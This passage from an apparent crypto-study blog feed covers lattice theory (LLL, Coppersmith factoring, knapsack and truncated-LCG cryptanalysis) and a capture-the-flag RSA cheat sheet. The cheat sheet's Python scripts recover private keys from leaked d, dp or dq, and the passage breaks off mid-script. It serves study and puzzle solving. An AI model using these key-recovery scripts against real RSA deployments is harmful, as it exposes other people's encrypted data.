inline">\(x_0\)</span>.</p><p><strong>Theorem 4.4.1.</strong> Let N=pq with p&lt;q&lt;2p. Let <span class="math inline">\(0&lt;\epsilon &lt;\frac{1}{4}\)</span>, and suppose <span class="math inline">\(\tilde{p}\in N\)</span> is such that <span class="math inline">\(|p-\tilde{p}|\leq \frac{1}{2\sqrt{2}}N^{\frac{1}{4}-\epsilon}\)</span>. Then given N and <span class="math inline">\(\tilde{p}\)</span> one can factor N in time polynomial in log(N) and <span class="math inline">\(\frac{1}{\epsilon}\)</span>.</p><p>By constructing lattice whose basis including <span class="math inline">\(NX^{i},X^{i}F(X)\)</span>.</p><h4 id="factoring-prq">4.4.3 Factoring <span class="math inline">\(p^{r}q\)</span></h4><p><strong>Example 4.4.2. (Takagi-RSA)</strong> Let <span class="math inline">\(N=p^{r}q\)</span> where p and q are primes and r&gt;1. Suppose the public exponent e in RSA is small. One can compute <span class="math inline">\(c^{d}(mod\ N)\)</span> as follows. Let <span class="math inline">\(d_{p}\equiv d(mod\ p-1)\)</span> and <span class="math inline">\(d_{q}\equiv d(mod\ q-1)\)</span>. One first computes <span class="math inline">\(m_{p}=c^{d_{p}}(mod\ p)\)</span> and <span class="math inline">\(m_{q}=c^{d_{q}}(mod\ q)\)</span>.</p><p>Then we can determine <span class="math inline">\(m(mod\ p^{r})\)</span> from <span class="math inline">\(m_p\)</span> by using Hensel lifting. If we have determined <span class="math inline">\(m_{i}\equiv m (mod\ p^{i})\)</span> then we lift to a solution modulo <span class="math inline">\(p^{i+1}\)</span> by writing <span class="math inline">\(m_{i+1}=m_{i}+kp^{i}\)</span>, where k is a variable. Then <span class="math display">\[m_{i+1}^{e}=(m_{i}+kp^{i})^{e}\equiv m_{i}^{e}+ekp^{i}m_{i}^{e-1}\equiv c(mod\ p^{i+1})\]</span> gives <span class="math inline">\(k\ mod(p^{i+1})\)</span>. The equation above is only efficient when e is small. If e is large then the Hensel lifting stage is no faster than just computing <span class="math inline">\(c^{d(mod\ \varphi(p^{r}))}(mod\ p^{r})\)</span> directly.</p><p>Coppersmith’s method can be used to factor integers of the form <span class="math inline">\(N=p^{r}q\)</span> when r is large. If one knows r and an approximation <span class="math inline">\(\tilde{p}\)</span> to p then there is a small root of the polynomial equation <span class="math display">\[F(x)=(\tilde{p}+x)^{r}\equiv 0(mod\ p^{r})\]</span> It is shown that if <span class="math inline">\(r\geq log(p)\)</span> then the algorithm runs in polynomial-time.</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lattice-Learning-1</title>
      <link href="/2020/02/29/Lattice-Learning-1/"/>
      <url>/2020/02/29/Lattice-Learning-1/</url>
      
        <content type="html"><![CDATA[<h2 id="chapter-1-lattice">Chapter 1 Lattice</h2><h3 id="basic-notions-on-lattices">1.1 Basic Notions on Lattices</h3><p><strong>Definition 1.1.1.</strong> Let <span class="math inline">\(\{\underline{b}_{1},...,\underline{b}_{n}\}\)</span> be a linearly independent set of (row) vectors in <span class="math inline">\(R^{m}(m\geq n)\)</span>. The lattice generated by <span class="math inline">\(\{\underline{b}_{1},...,\underline{b}_{n}\}\)</span> is the set <span class="math display">\[L=\{\sum^{n}_{i=1}l_{i}\underline{b}_{i}:l_{i}\in Z\}\]</span> of integer linear combinations of the <span class="math inline">\(\underline{b}_{i}\)</span>. The vectors <span class="math inline">\(\{\underline{b}_{1},...,\underline{b}_{n}\}\)</span> are called a lattice basis. The lattice rank is n and the lattice dimension is m. If n = m then L is said to be a full rank lattice.</p><p><strong>Lemma 1.1.2.</strong> Two <span class="math inline">\(a\times b\)</span> matrices B and B' generate the same lattice L if and only if B and B' are related by a unimodular matrix, i.e., <span class="math inline">\(B&#39;=UB\)</span> where U is an <span class="math inline">\(n\times n\)</span> matrix with integer entries and determinant ±1.</p><p><strong>Definition 1.1.3.</strong> Let L be a lattice in <span class="math inline">\(R^{m}\)</span> of rank n with basis matrix B. The <strong>Gram matrix</strong> of B is <span class="math inline">\(BB^{T}\)</span>. This is an <span class="math inline">\(n\times n\)</span> matrix whose (i, j)th entry is <span class="math inline">\(&lt;\underline{b}_{i},\underline{b}_{j}&gt;\)</span>.</p><p><strong>Lemma 1.1.4.</strong> Let L be a lattice in <span class="math inline">\(R^{m}\)</span> of rank n with basis matrix B. Then <span class="math inline">\(det(L)=\sqrt{det(BB^{T})}\)</span></p><p><strong>Definition 1.1.5.</strong> Let <span class="math inline">\(L\subset R^{m}\)</span> be a lattice of rank n. The <strong>successive minima</strong> of L are <span class="math inline">\(\lambda_{1},...,\lambda_{n}\in R\)</span> such that, for <span class="math inline">\(1\leq i\leq n,\lambda_{i}\)</span> is minimal such that there exist i linearly independent vectors <span class="math inline">\(\underline{v}_{1},...,\underline{v}_{i}\in L\)</span> with <span class="math inline">\(\left\|\underline{v}_{j}\right\|\leq \lambda_{i}\)</span> for <span class="math inline">\(1\leq j\leq i\)</span>.It follows that <span class="math inline">\(0&lt;\lambda_{1}&lt;\lambda_{2}&lt;...&lt;\lambda_{n}\)</span>. Sometimes there exists a basis consisting of vectors whose lengths are equal to the successive minima, but not always.</p><h3 id="the-hermite-and-minkowski-bounds">1.2 The Hermite and Minkowski Bounds</h3><p><strong>Theorem 1.2.1.</strong> (Minkowski) Let L be a lattice of rank n in <span class="math inline">\(R^{n}\)</span> with successive minima <span class="math inline">\(\lambda_{1},...,\lambda_{n}\)</span> for the Euclidean norm. Then <span class="math display">\[(\prod^{n}_{i=1}\lambda_{i})^{\frac{1}{n}}&lt;\sqrt{n}det(L)^{\frac{1}{n}}\]</span></p><h3 id="computational-problems-in-lattices">1.3 Computational Problems in Lattices</h3><p><strong>Definition 1.3.1.</strong> Let L be a lattice in <span class="math inline">\(Z^{m}\)</span></p><ol type="1"><li>The shortest vector problem (SVP) is the computational problem: given a basis matrix B for L, compute a non-zero vector <span class="math inline">\(\underline{v}\in L\)</span> such that <span class="math inline">\(\left\|\underline{v}\right\|\)</span> is minimal (i.e., <span class="math inline">\(\left\|\underline{v}\right\|=\lambda_{1}\)</span>).</li><li>The closest vector problem (CVP) is the computational problem: given a basis matrix B for L and a vector <span class="math inline">\(\underline{\omega}\in Q^{m}\)</span> (one can work with high-precision approximations in <span class="math inline">\(R^{m}\)</span>, but this is essentially still working in <span class="math inline">\(Q^{m}\)</span>), compute <span class="math inline">\(\underline{v}\in L\)</span> such that <span class="math inline">\(\left\|\underline{\omega}-\underline{v}\right\|\)</span> is minimal.</li><li>Others</li></ol><h2 id="chapter-2-lattice-basis-reduction">Chapter 2 Lattice Basis Reduction</h2><h3 id="lll-reduced-lattice-bases">2.1 LLL-Reduced Lattice Bases</h3><blockquote><p><strong>The Goal of Lattice Reduction</strong></p><p>Obtain a basis B in which the Gram-Schmidt vectors are not decreasing too quickly.</p><p>This roughly means that the basis vectors are somewhat orthogonal to each other.</p></blockquote><p><strong>Definition 2.1.1.</strong> Let <span class="math inline">\(\{\underline{b}_{1},...,\underline{b}_{n}\}\)</span> be linearly independent in <span class="math inline">\(R^{m}\)</span> and let <span class="math inline">\(\{\tilde{\underline{b}_{1}},...,\tilde{\underline{b}_{n}\}}\)</span> be the Gram-Schmidt orthogonalisation. Let <span class="math inline">\(\mu_{i,j}=\frac{&lt;\underline{b}_{i},\tilde{\underline{b}_{j}}&gt;}{\left\|\tilde{\underline{b}_{j}}\right\|^{2}}\)</span> for <span class="math inline">\(1\leq j&lt;i\leq n\)</span> be the coefficients from the Gram-Schmidt process. Fix <span class="math inline">\(\frac{1}{4}&lt;\delta&lt;1\)</span>. The (ordered) basis is <strong>LLL-Reduced</strong> (with factor <span class="math inline">\(\delta\)</span>) if the following conditions hold:</p><ul><li>(Size reduced) All <span class="math inline">\(|\mu_{i,j}|\leq 0.5\)</span>.</li><li>(Lov´asz condition) <span class="math inline">\((\delta-\mu_{i+1,i}^{2})\left\|\tilde{\underline{b}_{i}}\right\|^{2}\leq \left\|\tilde{\underline{b}_{i+1}}\right\|^{2}\)</span> (It is traditional to choose <span class="math inline">\(\delta=\frac{3}{4}\)</span> in this case).</li></ul><p><span class="math display">\[B=\left[ \begin{matrix}   1 &amp; 0 &amp; ... &amp; ... &amp; 0 \\   \mu_{2,1} &amp; 1 &amp; 0 &amp; ... &amp; 0 \\   \mu_{3,1} &amp; \mu_{3,2} &amp; 1 &amp; ... &amp; 0 \\   ... &amp; ... &amp; ... &amp; ... &amp; ... \\   0 &amp; 0 &amp; 0 &amp; ... &amp; 1  \end{matrix} \right]\left[ \begin{matrix}   \tilde{\underline{b}_{1}} \\   \tilde{\underline{b}_{2}} \\   ... \\   ... \\   \tilde{\underline{b}_{n}}  \end{matrix} \right]\]</span></p><p>Size reduced can be easily solved by Gauss elimination method while Lov´asz condition by swap <span class="math inline">\(b_{i}\)</span> and <span class="math inline">\(b_{j}\)</span>.</p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-1/image-20200227233301471.png"></p><h3 id="generic-problems-that-fall-under-the-scope-of-lattice-reduction">2.2 Generic Problems that Fall under the Scope of Lattice Reduction</h3><h4 id="pre-knowledge">2.2.1 Pre-knowledge</h4><p><strong>Lemma 2.2.1.</strong> Assume <span class="math inline">\(\{\underline{b}_{1},...,\underline{b}_{n}\}\)</span> is a family of vectors with integer coefficients <em>in the</em> t-dimensional space, with t&lt;n. Let M denote an upper bound for the absolute values of all coefficients of the various <span class="math inline">\(\underline{b}_{i}s\)</span>. There exists an integer relation <span class="math display">\[\sum_{i=1}^{n}\lambda_{i}\underline{b}_{i}=0\]</span> such that <span class="math inline">\(max|\lambda_{i}|\leq B\)</span>，where B is given by <span class="math display">\[logB=t\frac{logM+logn+1}{n-t}\]</span></p><h4 id="ordinary-case">2.2.2 Ordinary Case</h4><p>Given a family of integer vectors <span class="math inline">\(\{\underline{b}_{1},...,\underline{b}_{n}\}\)</span>, there exists an integer relation <span class="math display">\[\sum_{i=1}^{n}\alpha_{i}\underline{b}_{i}=0\]</span> We construct the lattice given by the rows of the following matrix: <span class="math display">\[\left[  \begin{matrix}  K\underline{b}_{1} &amp; 1 &amp; 0 &amp; ... &amp; 0\\  K\underline{b}_{2} &amp; 0 &amp; 1 &amp; ... &amp; 0\\  ... &amp; ... &amp; ... &amp; ... &amp; ...\\  K\underline{b}_{n} &amp; 0 &amp; 0 &amp; ... &amp; 1  \end{matrix}\right]\]</span> where K is a well chosen constant.</p><p>K should be large enough to ensure that the first vector of the reduced basis has zero components in its upper part corresponding to the first t coordinates, where t is the dimension of the <span class="math inline">\(\underline{b}_{i}\)</span>.</p><h4 id="modular-case">2.2.3 Modular Case</h4><p>We now discuss the case of <strong>mod m</strong> numbers. The basic problem is still how one can force lattice reduction to deal with modular relations. The matrix we construct is: <span class="math display">\[\left[  \begin{matrix}  K\underline{b}_{1} &amp; 1 &amp; 0 &amp; ... &amp; 0\\  K\underline{b}_{2} &amp; 0 &amp; 1 &amp; ... &amp; 0\\  ... &amp; ... &amp; ... &amp; ... &amp; ...\\  K\underline{b}_{n} &amp; 0 &amp; 0 &amp; ... &amp; 1\\  KmI &amp; 0 &amp; 0 &amp; ... &amp; 0  \end{matrix}\right]\]</span> where I is a t-dimensional <strong>identity matrix</strong>, with t the dimension of the <span class="math inline">\(\underline{b}_{i}\)</span>. It is clear that the added identity matrix force reduction of numbers module m.</p><h4 id="knapsack-problems">2.2.4 Knapsack problems</h4><p>In cryptographic scenarios, we know that such a relation exists between the given elements of the knapsack <span class="math inline">\(a_{1}, ..., a_{n}\)</span> and the target sum <span class="math inline">\(s=\sum^{n}_{i=1}\epsilon_{i}a_{i}.(\epsilon_{i}\in\{0,1\})\)</span></p><p>The euclidean size of this relation is <span class="math inline">\(\sqrt{\alpha n }\)</span>, where <span class="math inline">\(\alpha\)</span> is the proportion of ones in the relations. Moreover, <span class="math inline">\(\{\epsilon_{i}\}\)</span> can be seen as random, so we will set <span class="math inline">\(\alpha=\frac{1}{2}\)</span> here.</p><p>Subset sum problem can be converted into SVP and easily solved by LLL algorithm with the following matrix: <span class="math display">\[\left[\begin{matrix}Ka_{1} &amp; 1 &amp; 0 &amp; ... &amp; 0\\Ka_{2} &amp; 0 &amp; 1 &amp; ... &amp; 0\\... &amp; ... &amp; ... &amp; ... &amp; ...\\Ka_{n} &amp; 0 &amp; 0 &amp; ... &amp; 1\\Kc &amp; \frac{1}{2} &amp; \frac{1}{2} &amp; ... &amp; \frac{1}{2}\\\end{matrix}\right]\]</span> The reason for using <span class="math inline">\(\frac{1}{2}\)</span> rather than 0 in the last row vector, is that we want the correct vector to be as short as possible so that we can find it by solving SVP.</p><p>But the density of the knapsack should be low enough: <span class="math display">\[d=\frac{n}{log_{2}(max_{i}a_{i})}.\]</span> It is said that "almost all" subset sum problems with d(a)&lt;0.645 can be solved as SVP by LLL algorithm, but the difficulty of solving is also related to size of n.</p><h3 id="examples">2.3 Examples</h3><h4 id="cryptanalysis-of-knuths-truncated-lcg">2.3.1 Cryptanalysis of Knuth's truncated LCG</h4><p>LCG is defined by <span class="math inline">\(x_{i+1}=(ax_{i}+b)\)</span> mod m.</p><p>In case all the bits of the successive <span class="math inline">\(x_{i}s\)</span> are announced, the sequence becomes exactly predictable even if the modulus, the multiplier and the increment are not known. This is a result of J. Boyar.</p><p>The version we introduce(Knuth) extends the initial method to the case where a small portion of the lower bits are discarded. Moreover, our results cover the case where <em>m</em> and <em>a</em> are unknown parameters.</p><p><strong>First step of the algorithm</strong></p><p>We let <span class="math inline">\(\nu\)</span> be the number of bits of the modules m. If we output a proportion <span class="math inline">\(\alpha\)</span> of bits, we can write <span class="math display">\[x_{i}=2^{\beta\nu}y_{i}+z_{i}\]</span> where <span class="math inline">\(\beta=1-\alpha,y_{i}\)</span> consists of the leading bits of <span class="math inline">\(x_{i}\)</span> and <span class="math inline">\(z_{i}\)</span> of the trailing bits.</p><p>Our algorithm is more accurately described as a sequence of different algorithms depending on a parameter <em>t</em>.</p><p>We let <span class="math inline">\(V_{i}\)</span> be the element of <span class="math inline">\(Z^{t}\)</span> defined by <span class="math display">\[V_{i}=(y_{i+1}-y_{i},y_{i+2}-y_{i+1},...,y_{i+t}-y_{i+t-1})\]</span> Applying the techniques of section 2.2.2, we can find an linear relation <span class="math display">\[\sum^{n}_{i=1}\lambda_{i}V_{i}=0\]</span></p><p>whose coefficients are moderate integers. More precisely, it follows from lemma 2.2.1 that such a relation exists with <span class="math inline">\(|\lambda_{i}|\leq B\)</span> with <span class="math display">\[logB=t\frac{log(2^{\alpha\nu})+logn+1}{n-t}=t\frac{\alpha\nu+logn+1}{n-t}\]</span> We now consider the (unknown) vectors <span class="math inline">\(W_{i}\)</span> defined by <span class="math display">\[W_{i}=(x_{i+1}-x_{i},x_{i+2}-x_{i+1},...,x_{i+t}-x_{i+t-1})\]</span> and we let <span class="math display">\[U=\sum^{n}_{i=1}\lambda_{i}W_{i}\]</span> <span class="math inline">\(\because x_{i+j+1}-x_{i+j}=a^{j}(x_{i+1}-x_{i})\ mod\ m\)</span>，<span class="math inline">\(\therefore\)</span> all vectors <span class="math inline">\(W_{i}s\)</span> belong to the lattice L generated by the rows of the following matrix <span class="math display">\[\left[\begin{matrix}1 &amp; a &amp; a^{2} &amp; ... &amp; a^{t-1}\\0 &amp; m &amp; 0 &amp; ... &amp; 0\\0 &amp; 0 &amp; m &amp; ... &amp; 0\\... &amp; ... &amp; ... &amp; ... &amp; ...\\0 &amp; 0 &amp; 0 &amp; ... &amp; m\end{matrix}\right]\]</span> It is easily seen that <span class="math inline">\(det(L)=m^{t-1}\)</span>，hence the expected size of short vectors is around <span class="math inline">\(tm^{\frac{t-1}{t}}\)</span>(Minkowski Theorem). Since U belongs to L and is of size <span class="math inline">\(O(m^{\beta+\delta})\)</span>, for any <span class="math inline">\(\delta&gt;0\)</span>, (can be easily proved by <span class="math inline">\(\sum^{n}_{i=1}\lambda_{i}V_{i}=0\)</span>), U is unusually short as soon as <span class="math inline">\(\beta&lt;\frac{t-1}{t}\)</span>, which means <span class="math inline">\(\alpha&gt;\frac{1}{t}\)</span>. Such a vector has to be <strong>zero</strong>. (<span class="math inline">\(\lambda_{i}s\)</span> were produced by <span class="math inline">\(V_{i}s\)</span> and LLL algorithm)</p><p>Now we have U=0, and we can write U as <span class="math display">\[\sum^{n}_{i=1}\lambda_{i}W_{i}=(x_{1}-x_{0})\sum^{n}_{i=1}\lambda_{i}a^{i}\ mod\ m\]</span> As soon as <span class="math inline">\(x_{1}-x_{0}\)</span> is prime to m(unless <span class="math inline">\(x_{0}\)</span> is a bad seed), we get the polynomial <span class="math inline">\(P(x)=\sum\lambda_{i}x^{i}\)</span> vanishes at a module m. This is precisely what we want from the first step.</p><p><strong>Second step of the algorithm</strong></p><p>After applying part 1 several times, we come out with a sequence <span class="math inline">\(P_{1},...,P_{r}\)</span> of polynomials of degree n, each of these vanishing at a module m. Now, if we identify polynomials of degree n with elements of <span class="math inline">\(Z^{n+1}\)</span>(by coefficients), we see that the polynomials that <strong>vanish at a module m</strong> form a lattice L generated by the sequence <span class="math display">\[Q_{i}(x)=x^{i}-a^{i}(1\leq i\leq n)\]</span> which all vanish at a module m and by the constant polynomial m. The basis s generated by the row vectors below <span class="math display">\[\left[\begin{matrix}m &amp; 0 &amp; 0 &amp; ... &amp; 0\\-a &amp; 1 &amp; 0 &amp; ... &amp; 0\\-a^{2} &amp; 0 &amp; 1 &amp; ... &amp; 0\\... &amp; ... &amp; ... &amp; ... &amp; ...\\-a^{n} &amp; 0 &amp; 0 &amp; ... &amp; 1\end{matrix}\right]\]</span> which <span class="math inline">\(det(L)=m\)</span>. Now, if the <span class="math inline">\(P_{i}s\)</span> generate the lattice, then one can apply lattice reduction, output a basis of the lattice and <strong>compute the determinant</strong>. Based on experiments, we claim that such an algorithm actually discloses m.</p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-1/Snipaste_2020-04-08_23-23-15.png"></p><p>We finally say a word on recovering a from m. We twist the lattice L generated by <span class="math inline">\(P_{i}s\)</span> and constant m by multiplying all coefficients of <span class="math inline">\(degree\geq 2\)</span> by a large constant K and we apply lattice reduction. We usually let <span class="math inline">\(K\geq m2^\frac{n}{2}\)</span>, then the sublattice of L generated by m and x-a will be disclosed: this is because the shortest two vectors of L is of size m and any polynomial of the lattice with <span class="math inline">\(degree\geq 2\)</span> exceeds this size by a factor <span class="math inline">\(\geq 2^{\frac{n}{2}}\)</span>. So we can solve polynomial with <span class="math inline">\(degree\leq 2\)</span> to get a.</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary of Crypto in CTF(RSA)</title>
      <link href="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/"/>
      <url>/2020/02/28/Summary-of-Crypto-in-CTF-RSA/</url>
      
        <content type="html"><![CDATA[<h3 id="rsa---how-to-use-openssl">RSA - How to Use openssl</h3><p>Given <em>flag.enc</em>, <em>pubkey.pem/pub.key</em></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</span><br></pre></td></tr></table></figure></p><p>Then we get (e, n), after getting d:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line">c = bytes_to_long(open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>).read())</span><br><span class="line">print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="rsa---given-e-d-n">RSA - Given (e, d, (n))</h3><h4 id="theorem">Theorem</h4><ol type="1"><li>[Initialize] Set <span class="math inline">\(k\leftarrow d\cdot e-1\)</span></li><li>[Try a random g] Choose random small primes g = 2, 3, 5, 7, ...</li><li>[Next k] If <span class="math inline">\(2\mid k,k\leftarrow\frac{k}{2}\)</span> and <span class="math inline">\(x\leftarrow g^k\)</span> mod n, else go to step 2 (g <span class="math inline">\(\leftarrow\)</span> next_prime(g))</li><li>[Finish?] If <span class="math inline">\(y\leftarrow gcd(x-1,n)\ mod\ n&gt;1,p\leftarrow y,q\leftarrow n//y\)</span>, quit. Else go to step 3.</li></ol><h4 id="exp">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Factorize</span><span class="params">(n, e, d)</span>:</span></span><br><span class="line">    g = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = e * d - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> k &amp; <span class="number">1</span>:</span><br><span class="line">            k //= <span class="number">2</span></span><br><span class="line">            p = int(gcd(pow(g, k, n) - <span class="number">1</span>, n)) % n</span><br><span class="line">            <span class="keyword">if</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">        g = int(next_prime(g))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    d = </span><br><span class="line">    print(Factorize(n, e, d))</span><br></pre></td></tr></table></figure><h4 id="note">Note</h4><p>Given only (e, d) - [NCTF2019] babyRSA</p><h3 id="rsa---given-e-dp-n">RSA - Given (e, dp, n)</h3><h4 id="theorem-1">Theorem</h4><p><span class="math display">\[Known(e,dp,n),assume\ dp\equiv d(mod\ (p-1))\]</span></p><hr><p><span class="math inline">\(\because dp\cdot e\equiv d\cdot e\equiv 1(mod\ (p-1))\)</span></p><p><span class="math inline">\(\therefore dp\cdot e-1=k\cdot (p-1)\)</span></p><p><span class="math inline">\(\because dp\cdot e\equiv d\cdot e\equiv 1(mod\ (p-1))\)</span></p><p><span class="math inline">\(\therefore dp\cdot e-1=k\cdot (p-1)\)</span></p><p><span class="math inline">\(\therefore (dp\cdot e-1)\cdot d\cdot e=k&#39;\cdot (p-1),\quad k&#39;=k\cdot d\cdot e\)</span></p><p><span class="math inline">\(\Leftrightarrow d*e=-k&#39;\cdot (p-1)+dp\cdot e\cdot d\cdot e\equiv 1(mod\ \varphi(n))\Leftrightarrow -k&#39;\cdot (p-1)+dp\cdot e\equiv 1(mod\ \varphi(n))\)</span></p><p><span class="math inline">\(\therefore k_{1}\cdot (p-1)+dp\cdot e-1=k_{2}\cdot (p-1)\cdot (q-1)\Leftrightarrow (p-1)\cdot (k_{2}\cdot (q-1)-k_{1})+1=dp\cdot e\)</span></p><p><span class="math inline">\(\because dp&lt;p-1\quad \therefore (k_{2}\cdot (q-1)-k_{1})\in (0, e)\)</span></p><p><span class="math inline">\(\therefore\)</span>遍历i in range(1, e)，当同时满足</p><p><span class="math inline">\((dp\cdot e-1)\%i==0\)</span>和<span class="math inline">\(n\%((dp\cdot e-1)//i+1)==0时\)</span>，N成功分解.</p><h4 id="exp-1">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(e, dp, n)</span>:</span></span><br><span class="line">    _ = dp * e - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _ % i:</span><br><span class="line">            p = _ // i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> n % p:</span><br><span class="line">                q = n // p</span><br><span class="line">                phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                d = int(gmpy2.invert(e, phi))</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    e = int(input(<span class="string">"e = "</span>))</span><br><span class="line">    dp = int(input(<span class="string">"dp = "</span>))</span><br><span class="line">    n = int(input(<span class="string">"n = "</span>))</span><br><span class="line">    c = int(input(<span class="string">"c = "</span>))</span><br><span class="line">    d = decrypt(e, dp, n)</span><br><span class="line">    print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="rsa---given-p-q-dp-dq">RSA - Given (p, q, dp, dq)</h3><h4 id="theorem-2">Theorem</h4><p><span class="math display">\[Known(p,q,dp,dq),assume\ dp\equiv d(mod\ (p-1)),dq\equiv d(mod\ (q-1))\]</span></p><hr><p><span class="math inline">\(d\equiv dp(mod\ (p-1)),d\equiv dq(mod\ (q-1))\rightarrow ext\_CRT\ (\because gcd(p-1,q-1)\)</span>不一定等于1)</p><p><span class="math inline">\(\because d=k_{1}(p-1)+dp=k_{2}(q-1)+dq\Leftrightarrow k_{1}(p-1)=(dq-dp)+k_{2}(q-1)\)</span></p><p><span class="math inline">\(\Leftrightarrow k_{1}\frac{p-1}{gcd(p-1,q-1)}=\frac{dq-dp}{gcd(p-1,q-1)}+k_{2}\frac{q-1}{gcd(p-1,q-1)}\)</span></p><p><span class="math inline">\(\Rightarrow k_{1}\frac{p-1}{gcd(p-1,q-1)}\equiv\frac{dq-dp}{gcd(p-1,q-1)}(mod\ \frac{q-1}{gcd(p-1,q-1)})\)</span></p><p><span class="math inline">\(\Leftrightarrow k_{1}\equiv invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{dq-dp}{gcd(p-1,q-1)}(mod\ \frac{q-1}{gcd(p-1,q-1)})\)</span></p><p>将<span class="math inline">\(k_{1}=k_{3}\frac{q-1}{gcd(p-1,q-1)}+invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{dq-dp}{gcd(p-1,q-1)}\)</span>代入<span class="math inline">\(d=k_{1}(p-1)+dp\)</span></p><p><span class="math inline">\(d=k_{3}\frac{(p-1)(q-1)}{gcd(p-1,q-1)}+invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{(dq-dp)(p-1)}{gcd(p-1,q-1)}+dp\)</span></p><p><span class="math inline">\(\Rightarrow d\equiv invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{(dq-dp)(p-1)}{gcd(p-1,q-1)}+dp(mod\ \frac{(p-1)(q-1)}{gcd(p-1,q-1)})\)</span></p><h4 id="exp-2">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(p, q, dp, dq)</span>:</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    dd = int(gmpy2.gcd(p - <span class="number">1</span>, q - <span class="number">1</span>))</span><br><span class="line">    modules = phi // dd</span><br><span class="line">    d = int(gmpy2.invert((p - <span class="number">1</span>) // dd, (q - <span class="number">1</span>) // dd)) * \</span><br><span class="line">        (dq - dp) * (p - <span class="number">1</span>) // dd + dp</span><br><span class="line">    d %= modules</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(d, phi) == <span 